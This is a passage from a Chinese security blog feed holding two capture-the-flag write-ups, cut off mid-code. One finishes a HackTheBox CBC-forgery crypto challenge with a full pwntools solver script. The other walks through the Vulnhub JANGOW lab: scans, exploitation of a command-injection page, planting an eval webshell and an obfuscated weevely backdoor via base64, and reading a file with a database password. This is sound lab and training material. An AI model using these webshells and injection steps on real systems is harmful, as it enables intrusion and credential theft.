class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Cipher_Block_Payload == Cipher_Block_1</span><br><span class="line">encrypt(Plain_Block_Payload ^ Cipher_Block_1) == encrypt(Plain_Block_1 ^ Cipher_Block_0)</span><br><span class="line">Plain_Block_Payload ^ Cipher_Block_1 == Plain_Block_1 ^ Cipher_Block_0</span><br><span class="line">Plain_Block_Payload == Plain_Block_1 ^ Cipher_Block_0 ^ Cipher_Block_1</span><br></pre></td></tr></table></figure><p>所需的三个条件已知，所以我们可以很轻松的得到<code>Plain_Block_Payload</code></p><h2 id="encode-decode"><a class="markdownIt-Anchor" href="#encode-decode"></a> Encode &amp; Decode</h2><p>将构造的内容用pwntools发出后没有收到响应</p><p>多次调试后发现问题所在</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">send_msg(s, user +<span class="string">&quot;&#x27;s password: &quot;</span> )</span><br><span class="line">passwd = s.recv(<span class="number">4096</span>).decode().strip()</span><br></pre></td></tr></table></figure><p>本地生成算出Payload Hex形式后转字符串是用<code>ISO-8859-1</code>编码，这个单字节编码在处理<code>\x7f</code>以上的字符时很好用，所以顺手就用这个编码去处理Payload了</p><p>但是问题随之而来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UnicodeDecodeError: &#39;utf-8&#39; codec can&#39;t decode byte 0xa6 in position 15: invalid start byte</span><br></pre></td></tr></table></figure><p>也就是意味着我的ISO-8859-1编码的Payload需要能够被UTF-8编码处理</p><p>且UTF-8编码之后长度不会变长, 否则在Pad时会出现问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">padded &#x3D; pad(data.encode(),16,style&#x3D;&#39;pkcs7&#39;)</span><br></pre></td></tr></table></figure><p>WTF?</p><h2 id="guessing-game"><a class="markdownIt-Anchor" href="#guessing-game"></a> Guessing Game</h2><p>所以现在所能做的，就只有去修改<code>Plain_Block_1</code>的内容</p><p><code>Plain_Block_1</code>内容如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?????&amp;password&#x3D;?</span><br></pre></td></tr></table></figure><p>爆破六位掩码，这会影响<code>Cipher_Block_1</code>的结果</p><p>由于AES加密过程的扩散性，我们可以将<code>Cipher_Block_1</code>的结果看成是随机的</p><p>我们所需要的结果是<code>Payload_Block_Payload</code>的16字节均小于<code>\x80</code>，这样UTF-8编码就能处理</p><p>概率为1/65536，但值得一试</p><p>我们再理一遍思路</p><p>原始密码块如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">    Plain_Block_0       Plain_Block_1       Plain_Block_2</span><br><span class="line">    logged_username&#x3D;    admin&amp;password&#x3D;g    0ld3n_b0y</span><br><span class="line">IV  Cipher_Block_0      Cipher_Block_1      Cipher_Block_2</span><br></pre></td></tr></table></figure><p>我们需要的XOR结果如下</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target = Cipher_Block_0 ^ Plain_Block_1</span><br></pre></td></tr></table></figure><p>现在我们开始爆破<code>Plain_Block_1</code>，可以得到<code>Tmp_Cipher_Block_1</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">    Plain_Block_0       Tmp_Plain_Block_1   Tmp_Plain_Block_Payload     Plain_Block_2</span><br><span class="line">    logged_username&#x3D;    ?????&amp;password&#x3D;?    ????????????????            0ld3n_b0y</span><br><span class="line">IV  Cipher_Block_0      Tmp_Cipher_Block_1  Tmp_Cipher_Block_Payload    Cipher_Block_2</span><br></pre></td></tr></table></figure><p>得到的<code>Tmp_Cipher_Block_1</code>视为随机生成，可以轻松得到<code>Tmp_Plain_Block_Payload</code></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tmp_Plain_Block_Payload = Tmp_Cipher_Block_1 ^ target</span><br></pre></td></tr></table></figure><p>我们所需要确保的，就是这个<code>Tmp_Plain_Block_Payload</code>可以被UTF-8编码处理</p><p>在爆破出<code>Tmp_Plain_Block_Payload</code>之后，由于<code>Tmp_Cipher_Block_Payload</code>与<code>Cipher_Block_1</code>相等，<code>Cipher_Block_2</code>为预期值</p><p>输入<code>Cipher_Block_0 + Tmp_Cipher_Block_Payload + Cipher_Block_2</code>即可获得Flag</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;143.110.169.131&quot;</span></span><br><span class="line">port = <span class="number">30993</span></span><br><span class="line">p = remote(host, port)</span><br><span class="line">data = p.recv()</span><br><span class="line">p.sendline(<span class="string">b&quot;admin&quot;</span>)</span><br><span class="line">data = p.recv()</span><br><span class="line">payload_block = <span class="string">&quot;0123456789abcdef&quot;</span></span><br><span class="line">p.sendline((<span class="string">&quot;g&quot;</span> + payload_block + <span class="string">&quot;0ld3n_b0y&quot;</span>).encode())</span><br><span class="line">data = p.recvuntil(<span class="string">&quot;Leaked ciphertext: &quot;</span>)</span><br><span class="line">data = p.recv()</span><br><span class="line">data = data.decode().replace(<span class="string">&quot;\nenter ciphertext: &quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">p.close()</span><br><span class="line"></span><br><span class="line">cipher_0 = data[:<span class="number">32</span>]</span><br><span class="line">plain_1 = <span class="string">&quot;admin&amp;password=g&quot;</span></span><br><span class="line">target = <span class="built_in">int</span>(cipher_0, <span class="number">16</span>) ^ <span class="built_in">int</span>((binascii.hexlify(plain_1.encode()).decode()), <span class="number">16</span>)</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    print(count)</span><br><span class="line"></span><br><span class="line">    p = remote(host, port)</span><br><span class="line">    data = p.recv()</span><br><span class="line"></span><br><span class="line">    username = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        username = username + <span class="built_in">chr</span>(<span class="built_in">ord</span>(os.urandom(<span class="number">1</span>).decode(<span class="string">&quot;ISO-8859-1&quot;</span>)) % <span class="number">128</span>)</span><br><span class="line">    <span class="comment">#print(username)</span></span><br><span class="line"></span><br><span class="line">    p.sendline(username.encode())</span><br><span class="line">    data = p.recv()</span><br><span class="line">    payload_block = <span class="string">&quot;0123456789abcdef&quot;</span></span><br><span class="line">    pass_chr = <span class="built_in">chr</span>(<span class="built_in">ord</span>(os.urandom(<span class="number">1</span>).decode(<span class="string">&quot;ISO-8859-1&quot;</span>)) % <span class="number">128</span>)</span><br><span class="line">    <span class="comment">#print(pass_chr)</span></span><br><span class="line"></span><br><span class="line">    p.sendline((pass_chr + payload_block + <span class="string">&quot;0ld3n_b0y&quot;</span>).encode())</span><br><span class="line">    data = p.recvuntil(<span class="string">&quot;Leaked ciphertext: &quot;</span>)</span><br><span class="line">    data = p.recv()</span><br><span class="line">    data = data.decode().replace(<span class="string">&quot;\nenter ciphertext: &quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line">    cipher_1 = data[<span class="number">32</span>:<span class="number">64</span>]</span><br><span class="line">    ready = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    payload_hex = <span class="built_in">hex</span>(target ^ <span class="built_in">int</span>(cipher_1, <span class="number">16</span>))[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(payload_hex) % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">        payload_hex = <span class="string">&quot;0&quot;</span> + payload_hex</span><br><span class="line">    payload_block = binascii.unhexlify(payload_hex.encode()).decode(<span class="string">&quot;ISO-8859-1&quot;</span>)</span><br><span class="line">    <span class="comment">#print(payload_hex)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> payload_block:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(_) <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">128</span>):</span><br><span class="line">            <span class="comment">#print(hex(ord(_))[2:])</span></span><br><span class="line">            ready = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> ready == <span class="number">1</span>:</span><br><span class="line">        <span class="comment">#print(payload_block)</span></span><br><span class="line">        <span class="comment">#print(binascii.hexlify(username.encode()).decode())</span></span><br><span class="line">        <span class="comment">#print(binascii.hexlify(pass_chr.encode()).decode())</span></span><br><span class="line">        <span class="comment">#print(binascii.hexlify(payload_block.encode()).decode())</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">p = remote(host, port)</span><br><span class="line">data = p.recv()</span><br><span class="line">p.sendline(username.encode())</span><br><span class="line">data = p.recv()</span><br><span class="line">p.sendline((pass_chr + payload_block + <span class="string">&quot;0ld3n_b0y&quot;</span>).encode(<span class="string">&quot;ISO-8859-1&quot;</span>))</span><br><span class="line">data = p.recvuntil(<span class="string">&quot;Leaked ciphertext: &quot;</span>)</span><br><span class="line">data = p.recv()</span><br><span class="line">data = data.decode().replace(<span class="string">&quot;\nenter ciphertext: &quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">payload = data[:<span class="number">32</span>] + data[<span class="number">64</span>:<span class="number">128</span>]</span><br><span class="line">p.sendline(payload.encode())</span><br><span class="line">data = p.recv()</span><br><span class="line">p.close()</span><br><span class="line">print(data)</span><br></pre></td></tr></table></figure><hr/><h2 id=""><a class="markdownIt-Anchor" href="#"></a> 😅</h2><p>不需要验证前面的&quot;logged_username=&quot;是吧</p><p>直接字节翻转就完事了</p><p>密码块如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logged_username&#x3D;    Admin&amp;password&#x3D;g    0ld3n_b0y</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">decrypt(Block_Cipher_1)[<span class="number">0</span>] == <span class="string">&quot;A&quot;</span> ^ Block_Cipher_0[<span class="number">0</span>]</span><br><span class="line">New_Block_Cipher_0[<span class="number">0</span>] = <span class="string">&quot;A&quot;</span> ^ <span class="string">&quot;a&quot;</span> ^ Block_Cipher_0[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>代入得到</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">decrypt(Block_Cipher_1)[<span class="number">0</span>] == <span class="string">&quot;a&quot;</span></span><br></pre></td></tr></table></figure><hr /><p>难怪做的有点费劲，原来是非预期了啊😅，感觉这个思路都能出个题了都</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Dramatically solved.&lt;/p&gt;</summary>
    
    
    
    <category term="WriteUp" scheme="https://yoloyolo.top/categories/WriteUp/"/>
    
    
    <category term="Crypto" scheme="https://yoloyolo.top/tags/Crypto/"/>
    
    <category term="HackTheBox" scheme="https://yoloyolo.top/tags/HackTheBox/"/>
    
    <category term="CBC" scheme="https://yoloyolo.top/tags/CBC/"/>
    
  </entry>
  
  <entry>
    <title>Vulnhub_JANGOW_1.0.1</title>
    <link href="https://yoloyolo.top/2023/02/14/Vulnhub-JANGOW-1-0-1/"/>
    <id>https://yoloyolo.top/2023/02/14/Vulnhub-JANGOW-1-0-1/</id>
    <published>2023-02-13T22:59:27.000Z</published>
    <updated>2023-02-14T15:21:56.000Z</updated>
    
    <content type="html"><![CDATA[<p>Vulnhub年靶机数量</p><table><thead><tr><th style="text-align:center">Year</th><th style="text-align:center">Num</th></tr></thead><tbody><tr><td style="text-align:center">…</td><td style="text-align:center">…</td></tr><tr><td style="text-align:center">2018</td><td style="text-align:center">65</td></tr><tr><td style="text-align:center">2019</td><td style="text-align:center">117</td></tr><tr><td style="text-align:center">2020</td><td style="text-align:center">223</td></tr><tr><td style="text-align:center">2021</td><td style="text-align:center">108</td></tr><tr><td style="text-align:center">2022</td><td style="text-align:center">1</td></tr></tbody></table><p>难免对于一个时代的落幕感到惋惜</p><p>但同时庆幸自己能够在最好的时间参与其中</p><p>在学习的过程中享受这个过程</p><p>Thank you, Vulnhub &amp; every author.</p><p>Thank you for what I learned and every wonderful challenge I enjoyed.</p><a id="more"></a><h1 id="jangow-101"><a class="markdownIt-Anchor" href="#jangow-101"></a> <a href="https://www.vulnhub.com/entry/jangow-101,754/">JANGOW: 1.0.1</a></h1><p><code>2023-02-14 06:59:27</code></p><h2 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集"></a> 信息收集</h2><h3 id="ip探测"><a class="markdownIt-Anchor" href="#ip探测"></a> IP探测</h3><p><code>nmap -sn 192.168.56.0/24 | grep -B 2 Virtual</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.118</span><br><span class="line">Host is up (0.00010s latency).</span><br><span class="line">MAC Address: 08:00:27:BF:BA:62 (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure><h3 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h3><p><code>nmap -sV -Pn -v -T5 -A 192.168.56.118</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.118</span><br><span class="line">Host is up (0.00016s latency).</span><br><span class="line">Not shown: 998 filtered tcp ports (no-response)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: POST OPTIONS GET HEAD</span><br><span class="line">| http-ls: Volume /</span><br><span class="line">| SIZE  TIME              FILENAME</span><br><span class="line">| -     2021-06-10 18:05  site/</span><br><span class="line">|_</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Index of /</span><br><span class="line">MAC Address: 08:00:27:BF:BA:62 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.10 - 4.11, Linux 3.2 - 4.9</span><br><span class="line">Uptime guess: 0.041 days (since Tue Feb 14 06:38:08 2023)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty=263 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: Host: 127.0.0.1; OS: Unix</span><br></pre></td></tr></table></figure><h3 id="web路径枚举"><a class="markdownIt-Anchor" href="#web路径枚举"></a> Web路径枚举</h3><p><code>dirb http://192.168.56.118/ -w</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http://192.168.56.118/ ----</span><br><span class="line">+ http://192.168.56.118/server-status (CODE:403|SIZE:279)                         </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.118/site/ </span><br></pre></td></tr></table></figure><p><code>dirb http://192.168.56.118/site/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http://192.168.56.118/site/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.118/site/assets/                                       </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.118/site/css/                                          </span><br><span class="line">+ http://192.168.56.118/site/index.html (CODE:200|SIZE:10190)                           </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.118/site/js/                                           </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.118/site/wordpress/</span><br></pre></td></tr></table></figure><h2 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h2><p>访问<code>http://192.168.56.118/site/</code></p><p>点击右上角<code>Buscar</code>按钮跳转至<code>http://192.168.56.118/site/busque.php?buscar=</code></p><p>简单测试后发现命令执行漏洞</p><p><code>curl http://192.168.56.118/site/busque.php?buscar=ls</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">assets</span><br><span class="line">busque.php</span><br><span class="line">css</span><br><span class="line">index.html</span><br><span class="line">js</span><br><span class="line">wordpress</span><br></pre></td></tr></table></figure><p>以防万一，确认一下黑名单</p><p><code>curl 'http://192.168.56.118/site/busque.php?buscar=cat+./busque.php'</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system(<span class="variable">$_GET</span>[<span class="string">&#x27;buscar&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>确认写入权限</p><p><code>curl 'http://192.168.56.118/site/busque.php?buscar=ls+-la'</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">total 44</span><br><span class="line">drwxr-xr-x 6 www-data www-data  4096 Feb 13 17:59 .</span><br><span class="line">drwxr-xr-x 3 root     root      4096 Oct 31  2021 ..</span><br><span class="line">-rw-r--r-- 1 www-data www-data  1584 Feb 13 17:59 \</span><br><span class="line">drwxr-xr-x 3 www-data www-data  4096 Jun  3  2021 assets</span><br><span class="line">-rw-r--r-- 1 www-data www-data    35 Jun 10  2021 busque.php</span><br><span class="line">drwxr-xr-x 2 www-data www-data  4096 Jun  3  2021 css</span><br><span class="line">-rw-r--r-- 1 www-data www-data 10190 Jun 10  2021 index.html</span><br><span class="line">drwxr-xr-x 2 www-data www-data  4096 Jun  3  2021 js</span><br><span class="line">drwxr-xr-x 2 www-data www-data  4096 Jun 10  2021 wordpress</span><br></pre></td></tr></table></figure><p><code>curl 'http://192.168.56.118/site/busque.php?buscar=id'</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)</span><br></pre></td></tr></table></figure><p>尝试反弹Shell，失败</p><p>尝试通过Web服务传递Webshell，失败</p><p>疑似Ban了主动请求</p><p><code>echo -n '&lt;?php eval($_POST[&quot;BFL&quot;]);?&gt;' | base64</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgZXZhbCgkX1BPU1RbIkJGTCJdKTs/Pg==</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://192.168.56.118/site/busque.php?buscar=echo+-n+PD9waHAgZXZhbCgkX1BPU1RbIkJGTCJdKTs/Pg==|base64+-d&gt;bfl.php&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">weevely generate Bufferfly BFL.php</span><br><span class="line">cat BFL.php | base64</span><br><span class="line"></span><br><span class="line">PD9waHAKJHo9JyRrPSI1TGJMMmNMMjhlTGMiOyRraD0iNDE1NmRiYUwwNTM1NyJMOyRrZj0iNzc3</span><br><span class="line">MmYxOEwyTDg1YWIiOyRwPSJMJzsKJGw9J2JhTHNlNjRfZW5jb2RlKEBMTHhMKExAZ3pjb21McHJM</span><br><span class="line">ZXNzKCRvKSwkaykpO3ByaW50KCIkcCRraCRyJGtmIik7fSc7CiRBPSd0Y0xoKCIvJGtoKC4rKUwk</span><br><span class="line">a0xmLyIsQGZpbGVfZ2V0X2NvbnRMZW50cygicExocDovTC9pbnB1dEwiKSwkbSk9JzsKJHE9J3Js</span><br><span class="line">ZUxuKCRMdClMOyRvPSIiO2ZvcigkaUw9MDskaTwkbDtMTCl7Zm9Mcigkaj0wO0woJGo8JExjJiYk</span><br><span class="line">aTwkbCk7TCc7CiRUPSdMPTEpIEx7QG9MYl9zdGFydCgpTDtAZUx2YWwoQGd6dW5MY29tTHByZXNM</span><br><span class="line">cyhAeChAYkxhc2U2NExfZGVjb2RlKCQnOwokdD0nJGorTCssJGkrKyl7TCRvLj0kdEx7JGl9XiRr</span><br><span class="line">eyRqfUw7fX1yZUx0dXJMbiAkbzt9aWYgTChAcHJlZ19MbUxMYSc7CiRkPXN0cl9yZXBsYWNlKCdT</span><br><span class="line">eicsJycsJ1N6Y3JlYXRTemVfU3pTemZTenVuU3pjdGlvbicpOwokWD0nbUxbTDFdKSwkaykpKTsk</span><br><span class="line">TG89QG9MYl9nTGV0X2NvbnRMZW50THMoKTtAb2JfZW5MZF9jbGVMYW4oKTtMJHJMPUAnOwokdz0n</span><br><span class="line">RVZsNUx0dTJjNExKYXdDdXZrTEwiO2Z1bmN0aW9MbiB4KCR0LExMJGspeyRjPXN0ckxsTGVuKCRr</span><br><span class="line">KTskbD1zdCc7CiRmPXN0cl9yZXBsYWNlKCdMJywnJywkei4kdy4kcS4kdC4kQS4kVC4kWC4kbCk7</span><br><span class="line">CiRVPSRkKCcnLCRmKTskVSgpOwo/Pgo=</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://192.168.56.118/site/bfl.php&#x27;</span> --data <span class="string">&quot;BFL=system(&#x27;echo -n PD9waHAKJHo9JyRrPSI1TGJMMmNMMjhlTGMiOyRraD0iNDE1NmRiYUwwNTM1NyJMOyRrZj0iNzc3MmYxOEwyTDg1YWIiOyRwPSJMJzsKJGw9J2JhTHNlNjRfZW5jb2RlKEBMTHhMKExAZ3pjb21McHJMZXNzKCRvKSwkaykpO3ByaW50KCIkcCRraCRyJGtmIik7fSc7CiRBPSd0Y0xoKCIvJGtoKC4rKUwka0xmLyIsQGZpbGVfZ2V0X2NvbnRMZW50cygicExocDovTC9pbnB1dEwiKSwkbSk9JzsKJHE9J3JsZUxuKCRMdClMOyRvPSIiO2ZvcigkaUw9MDskaTwkbDtMTCl7Zm9Mcigkaj0wO0woJGo8JExjJiYkaTwkbCk7TCc7CiRUPSdMPTEpIEx7QG9MYl9zdGFydCgpTDtAZUx2YWwoQGd6dW5MY29tTHByZXNMcyhAeChAYkxhc2U2NExfZGVjb2RlKCQnOwokdD0nJGorTCssJGkrKyl7TCRvLj0kdEx7JGl9XiRreyRqfUw7fX1yZUx0dXJMbiAkbzt9aWYgTChAcHJlZ19MbUxMYSc7CiRkPXN0cl9yZXBsYWNlKCdTeicsJycsJ1N6Y3JlYXRTemVfU3pTemZTenVuU3pjdGlvbicpOwokWD0nbUxbTDFdKSwkaykpKTskTG89QG9MYl9nTGV0X2NvbnRMZW50THMoKTtAb2JfZW5MZF9jbGVMYW4oKTtMJHJMPUAnOwokdz0nRVZsNUx0dTJjNExKYXdDdXZrTEwiO2Z1bmN0aW9MbiB4KCR0LExMJGspeyRjPXN0ckxsTGVuKCRrKTskbD1zdCc7CiRmPXN0cl9yZXBsYWNlKCdMJywnJywkei4kdy4kcS4kdC4kQS4kVC4kWC4kbCk7CiRVPSRkKCcnLCRmKTskVSgpOwo/Pgo= | base64 -d &gt; BFL.php&#x27;);&quot;</span></span><br></pre></td></tr></table></figure><p><code>weevely http://192.168.56.118/site/BFL.php Bufferfly</code></p><p>算是获取了个Shell吧</p><h2 id="权限提升"><a class="markdownIt-Anchor" href="#权限提升"></a> 权限提升</h2><p><code>cat user.txt</code></p><p><strong><code>d41d8cd98f00b204e9800998ecf8427e</code></strong></p><p><code>cat /var/www/html/.backup</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$database</span> = <span class="string">&quot;jangow01&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;jangow01&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;abygurl69&quot;</span>;</span><br><span class="line"><span class="comment">// Create connection</span></span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$database</span>);</span><br><span class="line"><span class="comment">// Check connection</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Connection failed: &quot;</span> . mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Connected successfully&quot;</span>;</span><br><span class="line">mysqli_close(<span class="variable">$conn</span>);</span><br></pre></td></tr></table></figure><p><code>cat /var/www/html/site/wordpress/config.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span 